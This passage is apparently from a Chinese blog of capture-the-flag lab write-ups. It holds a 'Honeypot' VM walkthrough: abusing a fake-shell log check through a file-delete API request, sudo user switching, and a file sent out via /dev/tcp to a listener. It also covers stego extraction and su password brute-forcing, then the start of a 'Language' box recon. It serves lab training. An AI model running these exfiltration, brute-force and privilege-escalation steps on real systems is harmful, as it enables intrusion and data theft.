&#123;<br>            buffer[count] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (strlen(output) + count &lt; MAX_OUTPUT - 1) &#123;<br>                strcat(output, buffer);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                strncat(output, buffer, MAX_OUTPUT - strlen(output) - 1);<br>                <span class="hljs-built_in">break</span>;<br>            &#125;<br>        &#125;<br>        close(pipefd[0]);<br>        <br>        // 等待子进程结束<br>        waitpid(pid, NULL, 0);<br>        <br>        // 过滤xxxx敏感信息<br>        filter_xxxx_output(output);<br>    &#125;<br>&#125;<br><br>// 初始化日志文件<br>int <span class="hljs-function"><span class="hljs-title">init_logging</span></span>() &#123;<br>    // 检查日志文件是否存在<br>    <span class="hljs-keyword">if</span> (access(LOG_PATH, F_OK) != 0) &#123;<br>        <span class="hljs-built_in">return</span> 0;<br>    &#125;<br>    <br>    // 确保日志目录存在<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;/var/www&quot;</span>, 0777);<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;/var/www/html&quot;</span>, 0777);<br>    <br>    // 打开日志文件<br>    logfile = fopen(LOG_PATH, <span class="hljs-string">&quot;a&quot;</span>);<br>    <span class="hljs-keyword">if</span> (logfile == NULL) &#123;<br>        <span class="hljs-built_in">return</span> -1;<br>    &#125;<br>    <br>    // 设置文件权限<br>    <span class="hljs-built_in">chmod</span>(LOG_PATH, 0644);<br>    <span class="hljs-built_in">return</span> 1;<br>&#125;<br><br>// 启动真实的 shell<br>void <span class="hljs-function"><span class="hljs-title">launch_real_shell</span></span>() &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Warning: Log file not found, launching real shell environment\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;System maintenance mode activated\n&quot;</span>);<br>    <br>    // 执行真实的 shell<br>    execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, NULL);<br>    <span class="hljs-built_in">exit</span>(0);<br>&#125;<br><br>int <span class="hljs-function"><span class="hljs-title">main</span></span>() &#123;<br>    char input[MAX_CMD_LEN];<br>    char output[MAX_OUTPUT];<br>    <br>    // 初始化当前目录<br>    <span class="hljs-keyword">if</span> (getcwd(current_dir, sizeof(current_dir)) == NULL) &#123;<br>        strcpy(current_dir, <span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br>    <br>    // 初始化日志 - 检查文件是否存在<br>    int log_status = init_logging();<br>    <br>    // 如果日志文件不存在，启动真实 shell<br>    <span class="hljs-keyword">if</span> (log_status == 0) &#123;<br>        launch_real_shell();<br>        <span class="hljs-built_in">return</span> 0;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (log_status == -1) &#123;<br>        fprintf(stderr, <span class="hljs-string">&quot;Critical error: Failed to initialize logging system\n&quot;</span>);<br>        <span class="hljs-built_in">return</span> 1;<br>    &#125;<br>    <br>    // 清屏<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[H\033[J&quot;</span>);<br>    <br>    // 显示登录横幅<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Honeypot Terminal v2.0 - Restricted Environment\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Last login: %s from 192.168.1.123\n&quot;</span>, ctime(&amp;(time_t)&#123;<span class="hljs-keyword">time</span>(NULL) - 3600&#125;));<br>    <br>    // 主循环<br>    <span class="hljs-keyword">while</span> (1) &#123;<br>        // 打印提示符<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[1;32muser@honeypot\033[0m:\033[1;34m%s\033[0m# &quot;</span>, <br>               strcmp(current_dir, <span class="hljs-string">&quot;/xxxx&quot;</span>) == 0 ? <span class="hljs-string">&quot;~&quot;</span> : current_dir);<br>        fflush(stdout);<br>        <br>        // 读取用户输入<br>        <span class="hljs-keyword">if</span> (fgets(input, sizeof(input), stdin) == NULL) &#123;<br>            <span class="hljs-built_in">break</span>;<br>        &#125;<br>        <br>        // 移除换行符<br>        input[strcspn(input, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <br>        // 跳过空输入<br>        <span class="hljs-keyword">if</span> (strlen(input) == 0) &#123;<br>            <span class="hljs-built_in">continue</span>;<br>        &#125;<br>        <br>        // 记录输入<br>        log_activity(input, NULL);<br>        <br>        // 特殊处理<span class="hljs-built_in">cd</span>命令<br>        <span class="hljs-keyword">if</span> (strncmp(input, <span class="hljs-string">&quot;cd&quot;</span>, 2) == 0) &#123;<br>            char *path = strchr(input, <span class="hljs-string">&#x27; &#x27;</span>);<br>            <span class="hljs-keyword">if</span> (path) &#123;<br>                path++;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chdir</span>(path) != 0) &#123;<br>                    snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;bash: cd: %s: %s&quot;</span>, path, strerror(errno));<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    getcwd(current_dir, sizeof(current_dir));<br>                    output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br>                getcwd(current_dir, sizeof(current_dir));<br>                output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>        &#125; <br>        // 特殊处理<span class="hljs-built_in">exit</span>/logout<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strcmp(input, <span class="hljs-string">&quot;exit&quot;</span>) == 0 || strcmp(input, <span class="hljs-string">&quot;logout&quot;</span>) == 0) &#123;<br>            strcpy(output, <span class="hljs-string">&quot;logout&quot;</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output);<br>            log_activity(input, output);<br>            <span class="hljs-built_in">break</span>;<br>        &#125; <br>        // 特殊处理clear<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strcmp(input, <span class="hljs-string">&quot;clear&quot;</span>) == 0) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[H\033[J&quot;</span>);<br>            output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        &#125;<br>        // 处理其他命令<br>        <span class="hljs-keyword">else</span> &#123;<br>            execute_command(input, output);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output);<br>        &#125;<br>        <br>        // 记录输出<br>        log_activity(input, output);<br>    &#125;<br></code></pre></td></tr></table></figure><p>根据代码的注释，发现只要日志文件<code>LOG_PATH</code>不存在就会启动真实的SHELL<br>那么<code>#define LOG_PATH &quot;/var/www/html/history.txt&quot;</code>，删除<code>history.txt</code>文件即可</p><p>重新构造一个JSON请求，去删除文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /api/manage.php HTTP/1.1<br>Host: 192.168.2.41<br>Cache-Control: max-age=0<br>Authorization: Basic cm9vdDp0b29y<br>Accept-Language: zh-CN,zh;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Content-Type: <span class="hljs-string">&quot;application/json&quot;</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>Content-Length: 97<br><br>&#123;<br>  <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;file_delete&quot;</span>,<br>  <span class="hljs-string">&quot;params&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/var/www/html/history.txt&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302257792.png"></p><p>重新连接SSH</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># ssh root@192.168.2.41                                                                                                          </span><br> _   _                                    _   <br>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> ___  _ __   ___ _   _ _ __   ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_ </span><br><span class="hljs-string"></span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">/ _ \</span>|<span class="hljs-string"> &#x27;_ \ / _ \ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> &#x27;_ \ / _ \</span>|<span class="hljs-string"> __</span>|<br>|<span class="hljs-string">  _  </span>|<span class="hljs-string"> (_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  __/ </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) </span>|<span class="hljs-string"> (_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_ </span><br><span class="hljs-string"></span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">\___/</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">\___</span>|<span class="hljs-string">\__, </span>|<span class="hljs-string"> .__/ \___/ \__</span>|<br>                        |<span class="hljs-string">___/</span>|<span class="hljs-string">_</span>|<span class="hljs-string">             </span><br><span class="hljs-string">root@192.168.2.41&#x27;s password: </span><br><span class="hljs-string">Linux Honeypot 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Mon Jun 30 10:47:00 2025 from 192.168.2.4</span><br><span class="hljs-string">Warning: Log file not found, launching real shell environment</span><br><span class="hljs-string">System maintenance mode activated</span><br><span class="hljs-string">sh-5.0$ id</span><br><span class="hljs-string">uid=1001(root) gid=1001(root) groups=1001(root)</span><br><span class="hljs-string">sh-5.0$ bash</span><br><span class="hljs-string">root@Honeypot:~$ </span><br></code></pre></td></tr></table></figure><p>再次执行<code>sudo -l</code>，发现不需要密码即可执行<code>/bin/bash</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> root on Honeypot:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User root may run the following commands on Honeypot:<br>    (ALL : ALL) NOPASSWD: /usr/bin/bash<br>root@Honeypot:~$ <br></code></pre></td></tr></table></figure><p>直接执行，发现还没有变化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ <span class="hljs-built_in">sudo</span> /bin/bash<br>root@Honeypot:~$ <span class="hljs-built_in">id</span><br>uid=1001(root) gid=1001(root) <span class="hljs-built_in">groups</span>=1001(root)<br></code></pre></td></tr></table></figure><p>由于bash是 root 的 ，而真正的root是<code>toor</code>，故需要对用户进行切换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ <span class="hljs-built_in">sudo</span> -u toor /usr/bin/bash<br>toor@Honeypot:/home/root# <span class="hljs-built_in">id</span><br>uid=0(toor) gid=0(toor) <span class="hljs-built_in">groups</span>=0(toor)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight plaintext"><figcaption><span>cat root.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bashtoor@Honeypot:~#">flag&#123;root-771e84c4-5494-11f0-9a89-b70422752e89&#125;<br></code></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>在<code>/var/backups</code>里面有一个文件<code>xqa.jpg</code><br>发送到自己的kali上面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:/var/backups$ <span class="hljs-built_in">cat</span> xqa.jpg &gt; /dev/tcp/192.168.2.4/4444<br></code></pre></td></tr></table></figure><p>kali：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nc -lvnp 4444 &gt; 1.jpg                                             <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.41] 43448<br></code></pre></td></tr></table></figure><p>使用<code>stegseek</code>解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# stegseek 1.jpg     <br>StegSeek 0.6 - https://github.com/RickdeJager/StegSeek<br><br>[i] Found passphrase: <span class="hljs-string">&quot;&quot;</span><br>[i] Original filename: <span class="hljs-string">&quot;hello.zip&quot;</span>.<br>[i] Extracting to <span class="hljs-string">&quot;1.jpg.out&quot;</span>.<br></code></pre></td></tr></table></figure><p>解密出来两个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# unzip -l 1.jpg.out<br>Archive:  1.jpg.out<br>  Length      Date    Time    Name<br>---------  ---------- -----   ----<br>      168  2025-05-29 23:10   generate_by_username.sh<br>     3605  2025-05-31 09:48   muban.key<br>---------                     -------<br>     3773                     2 files<br></code></pre></td></tr></table></figure><p>发现是生成的密码的脚本，直接进行生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# bash generate_by_username.sh toor &gt; pass.txt<br></code></pre></td></tr></table></figure><p>使用<code>suForce</code>进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ ./suForce -u toor -w pass.txt <br>            _____                          <br> ___ _   _ |  ___|__  _ __ ___ ___   <br>/ __| | | || |_ / _ \| <span class="hljs-string">&#x27;__/ __/ _ \ </span><br><span class="hljs-string">\__ \ |_| ||  _| (_) | | | (_|  __/  </span><br><span class="hljs-string">|___/\__,_||_|  \___/|_|  \___\___|  </span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string"> code: d4t4s3c     version: v1.0.0</span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string">🎯 Username | toor</span><br><span class="hljs-string">📖 Wordlist | pass.txt</span><br><span class="hljs-string">🔎 Status   | 320/325/98%/toor2025</span><br><span class="hljs-string">💥 Password | toor2025</span><br><span class="hljs-string">───────────────────────────────────</span><br></code></pre></td></tr></table></figure><p>直接使用<code>toor:toor2025</code>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh toor@192.168.2.41    <br> _   _                                    _   <br>| | | | ___  _ __   ___ _   _ _ __   ___ | |_ <br>| |_| |/ _ \| <span class="hljs-string">&#x27;_ \ / _ \ | | | &#x27;</span>_ \ / _ \| __|<br>|  _  | (_) | | | |  __/ |_| | |_) | (_) | |_ <br>|_| |_|\___/|_| |_|\___|\__, | .__/ \___/ \__|<br>                        |___/|_|             <br>toor@192.168.2.41<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Honeypot 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Mon Jun 30 11:27:43 2025 from 192.168.2.41</span><br><span class="hljs-string">toor@Honeypot:~# id</span><br><span class="hljs-string">uid=0(toor) gid=0(toor) groups=0(toor)</span><br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">toor@Honeypot:~# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-771e84c4-5494-11f0-9a89-b70422752e89&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内部靶机/Maze-sec</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Language</title>
    <link href="/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/Language/"/>
    <url>/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/Language/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sn 192.168.2.0/24                                       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 15:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00044s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00066s latency).<br>MAC Address: 08:00:27:56:1F:86 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.39<br>Host is up (0.00058s latency).<br>MAC Address: 08:00:27:B7:8E:39 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 28.12 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.39</code></p><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -p- 192.168.2.39                        <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 15:39 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.39<br>Host is up (0.00029s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>9999/tcp open  abyss<br>MAC Address: 08:00:27:B7:8E:39 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 17.89 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80,9999</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,9999 192.168.2.39<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 15:40 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.39<br>Host is up (0.0048s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Site doesnt have a title (text/html).<br>9999/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>| http-git: <br>|   192.168.2.39:9999/.git/<br>|     Git repository found!<br>|     Repository description: Unnamed repository; edit this file <span class="hljs-string">&#x27;description&#x27;</span> to name the...<br>|     Remotes:<br>|_      https://github.com/zhuifengshaonianhanlu/pikachu.git<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-title: Get the pikachu<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>MAC Address: 08:00:27:B7:8E:39 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8, Linux 5.0 - 5.4<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 23.01 seconds<br></code></pre></td></tr></table></figure><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p><code>curl</code>80端口，没有发现任何东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl http://192.168.2.39     <br>index<br></code></pre></td></tr></table></figure><h3 id="1-目录爆破"><a href="#1-目录爆破" class="headerlink" title="1-目录爆破"></a>1-目录爆破</h3><p>尝试进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.39 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak <br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.39<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 6]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>也没有其他的目录，80端口基本上无任何东西</p><h2 id="2、9999端口"><a href="#2、9999端口" class="headerlink" title="2、9999端口"></a>2、9999端口</h2><p>访问9999端口，发现是一个<code>pikachu</code>的靶场<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506251544214.png"></p><h3 id="1-Getshell"><a 